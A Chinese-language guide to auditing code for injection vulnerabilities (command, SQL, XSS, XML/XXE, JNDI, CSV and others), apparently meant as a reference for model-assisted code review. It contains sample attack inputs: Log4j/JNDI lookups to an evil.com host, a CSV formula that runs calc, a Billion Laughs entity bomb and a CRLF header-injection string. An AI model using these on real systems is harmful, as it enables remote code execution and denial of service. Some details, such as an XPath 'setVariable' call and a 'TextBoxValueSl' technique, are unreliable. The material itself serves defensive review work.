## 能力目标

基于数据流和上下文分析,判断真实注入风险,识别可达的注入点,区分合法关联和恶意注入。

---

## 前置判断

获取:
- 输入来源: 用户输入/网络数据/文件内容/环境变量/数据库
- 输入类型: 字符串/JSON/XML/命令/URL路径
- 数据流路径: 从输入到执行点的完整传递链
- 编码和转义机制: 是否有输入验证、过滤、转义、编码
- 执行上下文: 注入点所处的执行环境(命令行/数据库/XML/HTML/日志)
- 语言和框架: 使用的安全API和防护机制
- 是否使用ORM、模板引擎等安全抽象层

---

## 分析流程

### Step 1 — 识别疑似注入点
定位可能的注入执行点:
- 命令执行: `exec`、`system`、`eval`、`Runtime.exec`、`subprocess`
- SQL查询: 原生SQL拼接、动态查询构建
- XML处理: XML解析器、XPath/XQuery评估
- HTML输出: 模板引擎、innerHTML、document.write
- 日志输出: 日志记录函数、异常消息
- 文件操作: CSV导出、文件路径拼接

### Step 2 — 追踪污点数据流
- 广度优先追踪: 从用户输入到所有可能的影响点
- 反向追踪: 从注入点回溯数据来源
- 数据转换链: 识别数据在传递过程中的转换操作
- 污点消失点: 消毒函数、编码、类型转换

### Step 3 — 验证防护机制
- 输入验证: 白名单/黑名单、长度限制、格式验证
- 输出编码: HTML编码、XML编码、URL编码、Shell转义
- 参数化查询: 预编译语句、绑定参数
- 权限控制: 执行权限、文件访问限制
- 框架防护: ORM、模板引擎自动转义、CSRF保护

### Step 4 — 判断真实风险
- 可达性: 注入点是否可被外部触发
- 可控性: 攻击者能否控制注入的payload
- 上下文: 注入内容在目标上下文中的语法有效性
- 影响范围: 注入成功后的潜在危害

---

## 风险模式分类

### CAT-0020 命令注入
应用程序将不受信任的数据作为命令或命令的一部分传递给操作系统执行器。

**触发条件**:
- 直接拼接用户输入到命令字符串: `system("ls " + user_input)`
- 使用 `exec`、`Runtime.exec`、`subprocess`、`os.system` 等函数
- 未对输入进行适当转义或验证
- 通过环境变量传递用户输入到命令

**分析方法**:
1. 识别所有命令执行点的函数调用
2. 追踪命令字符串的构建过程,查找用户输入参与点
3. 检查是否使用参数化命令执行方式(如数组参数)
4. 验证输入是否有白名单验证或语法过滤

**典型漏洞模式**:
```c
// 危险: 直接拼接输入
system("cat " + filename);

// 安全: 使用参数化或白名单验证
if (isValidFilename(filename)) {
    execlp("cat", "cat", filename, NULL);
}
```

**防护措施**:
- 使用参数化API而非字符串拼接
- 输入白名单验证(文件名、命令选项)
- Shell元字符转义或移除: `| & ; $ ( ) < > \t \n`
- 降级权限,使用最小权限原则

---

### CWD-1073 XSS注入(跨站脚本攻击)
应用程序允许不受信任的数据在生成的网页中显示,未经过适当地转义或验证。

**触发条件**:
- 用户输入直接插入HTML文档: `<div>${user_input}</div>`
- 使用 `innerHTML`、`document.write`、`eval` 等危险API
- 使用 JavaScript 模板字符串拼接未转义内容
- 未对输出上下文进行适当编码(HTML属性、JavaScript、CSS、URL)

**分析方法**:
1. 追踪用户输入到页面输出的完整路径
2. 识别输出上下文(HTML内容、属性、JavaScript、CSS、URL)
3. 检查是否使用模板引擎的自动转义
4. 验证是否正确使用上下文感知的编码函数

**典型漏洞模式**:
```javascript
// 危险: 未转义输出
element.innerHTML = user_input;

// 安全: 使用textContent或适当的编码
element.textContent = user_input;
// 或
element.innerHTML = escapeHtml(user_input);
```

**防护措施**:
- 使用模板引擎并启用自动转义
- 根据输出上下文使用适当的编码: HTML实体编码、JavaScript编码、URL编码
- 实现内容安全策略(CSP)
- 对富文本内容使用白名单过滤(如DOMPurify)

---

### CWD-1081 XML注入
应用程序将不受信任数据作为XML内容插入,未进行适当的验证或编码。

**触发条件**:
- 用户输入直接拼接为XML内容: `"<user>" + input + "</user>"`
- 构建XML SOAP请求时拼接用户数据
- 未验证XML的特殊字符: `<` `>` `&` `'` `"`
- 不安全的XML解析器配置

**分析方法**:
1. 定位XML文档构建和输出的代码位置
2. 检查XML内容的拼接方式
3. 验证是否对特殊XML字符进行转义
4. 检查XML解析器是否禁用外部实体(防XXE)

**典型漏洞模式**:
```python
# 危险: 直接拼接
xml = "<user>" + username + "</user>"

# 安全: 使用XML构建器
user_elem = ET.SubElement(root, "user")
user_elem.text = username
```

**防护措施**:
- 使用XML库提供的API构建XML,而非字符串拼接
- 对插入内容进行XML编码
- 禁用XML解析器的外部实体处理(防XXE)
- 对用户输入进行格式和长度验证

---

### CWD-1082 XPath注入
应用程序将不受信任数据作为XPath查询的一部分,可能导致非授权的数据访问。

**触发条件**:
- 用户输入直接拼接为XPath表达式: `"//user[name='" + user_input + "']"`
- 动态构建XPath查询语句
- 未对输入进行XPath元字符转义

**分析方法**:
1. 识别所有XPath查询构建点
2. 检查用户输入如何参与查询构建
3. 验证是否有参数化XPath或白名单验证
4. 追踪查询结果如何被使用

**典型漏洞模式**:
```java
// 危险: 字符串拼接
XPathExpression expr = xpath.compile("//user[name='" + username + "']");

// 安全: 使用参数化XPath或预编译测试
if (username.matches("[a-zA-Z0-9]+")) {
    XPathExpression expr = xpath.compile("//user[name=?]");
    expr.setVariable("username", username);
}
```

**防护措施**:
- 使用参数化XPath查询(如XQuery 3.0)
- 输入白名单验证,限制为合法的节点名或属性值
- 对输入进行XPath元字符转义: `' " `= < > ( ) / @ * [ ] 等
- 使用最小权限的XPath表达式,避免使用过于宽泛的轴(如 `//`)

---

### CWD-1083 XQuery注入
应用程序将不受信任数据作为XQuery查询的一部分,可能导致数据泄露或篡改。

**触发条件**:
- 用户输入直接拼接为XQuery表达式
- 动态构建XQuery查询语句
- 未对输入进行适当的转义或验证

**分析方法**:
1. 识别XQuery查询的动态构建位置
2. 检查用户输入在查询中的角色
3. 验证是否使用参数绑定而非拼接
4. 评估查询对数据的影响范围

**典型漏洞模式**:
```xquery
(: 危险: 字符串拼接 :)
let $query := concat("for $user in //user[name='", $input, "'] return $user")

(: 安全: 使用参数化或预编译 :)
declare variable $username as xs:string external;
for $user in //user[name=$username] return $user
```

**防护措施**:
- 使用外部变量参数化XQuery查询
- 输入白名单验证
- 限制查询权限和结果集大小
- 对查询进行审查,避免危险的XQuery功能(如file: functions)

---

### CWD-1084 XSLT注入
应用程序将不受信任数据作为XSLT转换的一部分,可能导致代码执行。

**触发条件**:
- 用户输入参与XSLT样式表的构建
- 使用不受信任的XSLT进行XML转换
- 允许XSLT扩展函数(如 `document()`, `xsl:script`)
- 未限制XSLT处理器的安全设置

**分析方法**:
1. 检查XSLT样式表的生成方式
2. 验证是否允许用户上传或提供XSLT
3. 检查XSLT处理器的安全配置
4. 识别是否启用了危险的扩展功能

**典型漏洞模式**:
```java
// 危险: 使用动态XSLT
TransformerFactory factory = TransformerFactory.newInstance();
Transformer transformer = factory.newTransformer(new StreamSource(userProvidedXSLT));

// 安全: 使用预定义、受信任的XSLT
Transformer transformer = factory.newTransformer(new StreamSource("/secure/transform.xsl"));
factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
```

**防护措施**:
- 禁用动态XSLT加载,只使用预定义、受信任的样式表
- 启用XML的安全处理功能: `FEATURE_SECURE_PROCESSING`
- 禁用XSLT扩展函数和外部实体
- 对输出进行适当的转义和验证

---

### CWD-1085 JSON注入
应用程序将不受信任数据作为JSON内容插入,可能导致JSON结构篡改或注入。

**触发条件**:
- 用户输入直接拼接为JSON字符串: `'{"name":"' + input + '"}'`
- 不安全的JSON解析器配置
- JSON劫持攻击(JSONP滥用)
- 利用JSON解析器特性进行注入

**分析方法**:
1. 识别JSON数据的构建方法
2. 检查是否使用字符串拼接而非JSON库
3. 验证JSON解析器的安全设置
4. 检查JSONP的使用方式

**典型漏洞模式**:
```javascript
// 危险: 字符串拼接
const json = '{"user":"' + userInput + '"}';

// 安全: 使用JSON.stringify或库函数
const json = JSON.stringify({user: userInput});
```

**防护措施**:
- 使用标准的JSON库构建和解析JSON
- 对输出进行适当的编码(如防XSS的上下文编码)
- 避免使用不安全的JSONP,改用CORS
- 验证JSON的完整性

---

### CWD-1086 CRLF注入
应用程序将不受信任数据插入HTTP响应头或其他行分隔位置,可能导致头部注入或请求走私。

**触发条件**:
- 用户输入直接设置HTTP响应头: `Set-Cookie: user=` + user_input
- 重定向URL中的换行符未过滤
- 日志文件中使用用户输入且未转义换行符
- email消息体中使用未过滤的输入

**分析方法**:
1. 检查所有HTTP响应头的设置位置
2. 追踪重定向URL的构建过程
3. 检查日志输出中用户输入的处理
4. 验证是否过滤或转义CRLF字符

**典型漏洞模式**:
```http
// 危险: 直接设置响应头
Set-Cookie: user=<CR><LF>X-Hacked-Header: value

// 安全: 验证输入或移除危险字符
response.setHeader("Set-Cookie", validateHeaderValue(userInput));
```

**防护措施**:
- 过滤所有用户输入中的CR(\r, 0x0d)和LF(\n, 0x0a)字符
- 对响应头值进行严格验证
- 使用安全的HTTP库函数设置响应头
- 避免在日志中记录未转义的用户输入

---

### CWD-1089 日志注入(日志中和不当)
应用程序将不受信任的数据直接记录到日志文件中,未转义或处理特殊字符。

**触发条件**:
- 日志中直接记录用户输入且未转义
- 日志解析器被注入的换行符或控制字符欺骗
- 通过日志注入实施日志伪造攻击
- 使用日志文件作为日志注入到其他系统的向量

**分析方法**:
1. 识别所有日志记录调用
2. 检查用户输入是否直接写入日志
3. 验证是否对特殊字符(CRLF、控制字符)进行转义
4. 考虑日志的后续使用和解析方式

**典型漏洞模式**:
```java
// 危险: 直接记录
logger.info("User login: " + username);

// 安全: 转义或规范化
logger.info("User login: " + sanitizeForLog(username));
```

**防护措施**:
- 对用户输入进行规范化,移除或转义控制字符
- 使用结构化日志格式(JSON)对数据编码
- 对敏感信息进行脱敏处理
- 限制日志的访问权限

---

### CAT-0022 代码注入
应用程序允许不受信任的代码或表达式执行,可能导致任意代码执行。

**触发条件**:
- 使用 `eval()` 或类似动态代码执行函数
- 反序列化不受信任对象
- 模板引擎允许执行任意代码
- 动态加载外部代码或插件

**分析方法**:
1. 识别所有动态代码执行点: `eval`、`exec`、`Function`构造器
2. 检查反序列化操作是否验证数据源
3. 验证模板引擎的安全配置
4. 检查动态加载代码的机制

**典型漏洞模式**:
```javascript
// 危险: eval执行
eval("someFunction('" + userInput + "')");

// 危险: 反序列化
Object obj = ois.readObject(); // 未过滤的输入

// 安全: 使用安全的模板引擎避免代码执行
const template = Mustache.compile(userTemplate); // Mustache默认禁止代码执行
```

**防护措施**:
- 避免使用 `eval()`、`exec()` 等动态代码执行
- 使用安全的模板引擎(限制为数据绑定)
- 反序列化前验证数据源和完整性
- 实施严格的输入验证和白名单
- 使用沙箱环境隔离代码执行

---

### CAT-0023 资源注入
应用程序允许不受信任的数据指定系统资源(文件、URL、端口),可能导致路径遍历或SSRF。

**触发条件**:
- 用户输入直接用作文件路径: `fopen(user_input)`
- 用户输入指定URL进行请求: `fetch(user_input)`
- 用户输入指定端口号或网络地址
- 未验证或规范化资源路径

**分析方法**:
1. 识别所有资源打开或请求操作
2. 检查用户输入如何影响资源路径
3. 验证路径规范化逻辑(处理 `../` 等)
4. 检查是否限制资源访问范围

**典型漏洞模式**:
```python
# 危险: 路径遍历
file_path = os.path.join(base_dir, filename)  # filename 可包含 ../
with open(file_path) as f:
    content = f.read()

# 危险: SSRF
response = requests.get(user_url)

# 安全: 路径验证和限制
safe_path = os.path.normpath(os.path.join(base_dir, filename))
if not safe_path.startswith(base_dir):
    raise ValueError("Invalid path")
```

**防护措施**:
- 规范化路径并验证其在允许的范围内
- 使用白名单限制可访问的资源
- 对URL进行域限制和内部IP检查(防SSRF)
- 使用最小权限原则访问资源

---

### CWD-1845 JNDI注入
应用程序使用不受信任的数据进行JNDI查找,可能导致远程代码执行。

**触发条件**:
- 用户输入作为JNDI名称传递: `ctx.lookup(user_input)`
- 在Log4j等日志框架中使用JNDI字符串
- 未禁用危险的JNDI协议(rmi, ldap, iiop)
- 使用易受攻击的Java或框架版本

**分析方法**:
1. 识别所有JNDI查找调用
2. 追踪传递给 `lookup()` 的数据流
3. 检查是否使用Log4j等易受攻击的框架
4. 验证JNDI协议是否受限

**典型漏洞模式**:
```java
// 危险: JNDI注入
Context ctx = new InitialContext();
Object obj = ctx.lookup(user_input); // user_input 可能是 ldap://evil.com/exploit

// 危险: Log4j漏洞
logger.error("User: ${jndi:rmi://evil.com/exploit}");

// 安全: 验证输入或禁用危险协议
if (isValidJndiName(jndiName)) {
    ctx.lookup(jndiName);
}
```

**防护措施**:
- 禁用危险的JNDI协议: `com.sun.jndi.rmi.object.trustURLCodebase=false`
- 对JNDI名称进行白名单验证
- 升级到修复版本(Log4j 2.15+, JDK 6u211+, 7u201+)
- 移除消息查找插件的JNDI支持(Action=omitMessage)

---

### CAT-0024 数据查询逻辑中特殊元素处理不当(如SQL注入)
应用程序将不受信任的数据作为数据库查询的一部分,可能导致SQL注入。

**触发条件**:
- 用户输入直接拼接为SQL语句: `"SELECT * FROM users WHERE name='" + input + "'"`
- 动态构建SQL查询
- 未使用参数化查询
- 未对特殊SQL字符进行转义或过滤

**分析方法**:
1. 识别所有SQL查询的构建位置
2. 检查是否使用参数化查询(PreparedStatement)
3. 验证用户输入是否参与SQL拼接
4. 追踪输入验证和过滤机制

**典型漏洞模式**:
```java
// 危险: SQL拼接
String query = "SELECT * FROM users WHERE name='" + username + "'";

// 安全: 参数化查询
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE name = ?");
stmt.setString(1, username);
```

**防护措施**:
- 始终使用参数化查询(PreparedStatement)
- 输入验证和类型检查
- 最小权限的数据库账户
- ORM框架(如Hibernate、MyBatis)的参数化查询
- 避免在存储过程中拼接动态SQL

---

### CWD-1113 CSV注入
应用程序将用户提供的数据导出为CSV格式,可能导致公式注入攻击。

**触发条件**:
- 用户输入直接写入CSV单元格且未转义
- 导出的CSV在Excel等应用中打开
- 输入以公式字符开头: `=`, `-`, `+`, `@`
- 未清理危险函数调用: `HYPERLINK()`, `CMD()`, `POWER()`

**分析方法**:
1. 识别所有CSV导出操作
2. 检查用户输入是否直接写入CSV
3. 验证是否转义或移除危险字符
4. 考虑导出数据的后续使用环境

**典型漏洞模式**:
```python
# 危险: 直接导出
csv_writer.writerow([user_input, email, phone])
# 如果 user_input 是 =cmd|' /C calc'!A0,会在Excel中执行calc

# 安全: 转义危险字符
safe_input = user_input
if safe_input.startswith(('=', '-', '+', '@')):
    safe_input = "'" + safe_input
csv_writer.writerow([safe_input, email, phone])
```

**防护措施**:
- 对以 `=`, `-`, `+`, `@` 开头的单元格添加单引号前缀
- 使用安全的CSV库自动处理转义
- 对危险函数名进行过滤或替换
- 提供安全的CSV导出格式(如使用TextBoxValueSl技术)

---

### CWD-1114 XML外部实体攻击(XXE)
应用程序解析XML时启用了外部实体解析,可能导致敏感数据泄露或SSRF。

**触发条件**:
- XML解析器启用了外部实体处理
- 解析不受信任的XML输入
- 未禁用DTD或外部实体解析
- 使用易受攻击的XML配置

**分析方法**:
1. 识别所有XML解析操作
2. 检查XML解析器的配置
3. 验证是否禁用外部实体解析
4. 追踪XML输入的数据来源

**典型漏洞模式**:
```java
// 危险: 默认配置允许外部实体
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(userXml); // 可能触发XXE攻击

// 安全: 禁用外部实体
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(userXml);
```

**防护措施**:
- 禁用DTD处理: `disallow-doctype-decl=true`
- 禁用外部实体: `external-general-entities=false`, `external-parameter-entities=false`
- 使用安全的XML解析器配置(`FEATURE_SECURE_PROCESSING`)
- 使用JSON等更安全的格式替代XML
- 升级到修复漏洞的XML库版本

---

### CWD-1115 XML内部实体扩展(XEE)
应用程序解析XML时未限制内部实体扩展,可能导致拒绝服务攻击。

**触发条件**:
- XML解析器未限制实体扩展
- 允许递归实体定义
- 解析不受信任的XML输入
- 大量嵌套实体导致资源耗尽

**分析方法**:
1. 识别XML解析操作
2. 检查解析器对实体扩展的限制
3. 验证输入XML的大小和复杂度
4. 考虑 Billion Laughs 攻击向量

**典型漏洞模式**:
```xml
<!-- Billion Laughs 攻击示例 -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
```

**防护措施**:
- 限制实体扩展深度和大小
- 禁用DTD处理或至少限制内部实体
- 使用带有安全配置的XML解析器
- 对输入XML的大小和复杂度进行限制
- 升级易受攻击的XML库版本

---

## 代码分析视角

### 污点分析
- **污点标记**: 标记用户输入为污点
- **污点传播**: 追踪污点数据在代码中的传递链
- **污点汇聚**: 识别注入点(污点的危险使用位置)
- **污点消毒**: 识别输入验证、编码、转义等操作

### 上下文分析
- **输出上下文**: 差异化HTML内容、属性、JavaScript、CSS、URL等上下文
- **编码需求**: 根据上下文确定适当的编码方式
- **语法分析**: 验证注入内容在目标上下文中的有效性

### 数据流分析
- **正向追踪**: 从输入到输出的完整路径
- **反向追踪**: 从注入点回溯数据来源
- **跨函数/模块追踪**: 识别跨边界的数据传递

### 验证机制分析
- **输入验证**: 白名单/黑名单、长度、格式验证
- **输出编码**: 编码函数的正确使用
- **类型安全**: 强类型约束在防注入中的作用
- **框架防护**: ORM、模板引擎等抽象层的安全性

---

## 典型触发条件

| 注入类型 | 高频触发条件 |
|---------|-------------|
| 命令注入 | `system()` 拼接输入、Shell字符未过滤 |
| XSS注入 | `innerHTML`、未转义的模板渲染 |
| XML注入 | 字符串拼接构建XML |
| SQL注入 | 字符串拼接SQL语句、未使用参数化查询 |
| 日志注入 | 直接记录用户输入、未转义换行符 |
| CRLF注入 | 响应头用户输入未过滤CR/LF |
| 资源注入 | 文件路径拼接、SSRF |
| JNDI注入 | `ctx.lookup(user_input)`、Log4j漏洞 |
| XXE攻击 | XML解析器默认启用外部实体 |
| XEE攻击 | 未限制XML内部实体扩展 |
| CSV注入 | 公式字符未转义导出到CSV |
| 代码注入 | `eval()`、不安全的反序列化 |

---

## 结论模板

```
## 结论
[问题存在+严重性:高/中/低+注入类型]

## 注入点与数据流
- 注入类型: [命令注入/XSS/SQL注入等]
- 注入位置: [文件:行号] [函数名]
- 输入来源: [用户输入/环境变量/网络数据等]
- 污点传播路径: [详细的数据流追踪]

## 证据链与逻辑推理
1. 代码证据:具体代码行和数据流
2. 污点追踪:输入如何传递到注入点
3. 漏洞描述:具体的注入漏洞
4. 推理:为何导致注入攻击

## 真实触发条件
输入条件、数据流路径、可利用性评估

## 影响评估
| 维度 | 评估 | 说明 |
|------|------|------|
| 可利用性 | 高/中/低 | 攻击者控制难度 |
| 影响范围 | 高/中/低 | 数据泄露/代码执行/文件系统访问/DoS |
| 业务影响 | 高/中/低 | |

## 修改建议
方案一+代码示例+优缺点
推荐:XXX

## 边界与不确定性
确定事实、不确定假设、建议调查点
```

---

## 非"执行逻辑"

本文档仅作知识参考和结构化指南,不执行代码、自动扫描、生成修复脚本或最终裁决。模型应结合具体业务场景推理,非机械匹配。

---

## 典型误报场景

不应报告:
- 参数化查询或预备语句的正确使用
- 输入经过白名单严格验证
- 框架提供的自动转义机制(如Vue的v-text)
- 使用安全编码后的正确输出
- 内部数据流,非外部可触发
- 已被安全库(如DOMPurify)过滤的内容
- 格式化字符串中的固定模板
- 经过上下文感知编码的输出

---

**文档版本**: v1.0 | **适用语言**: 多语言通用
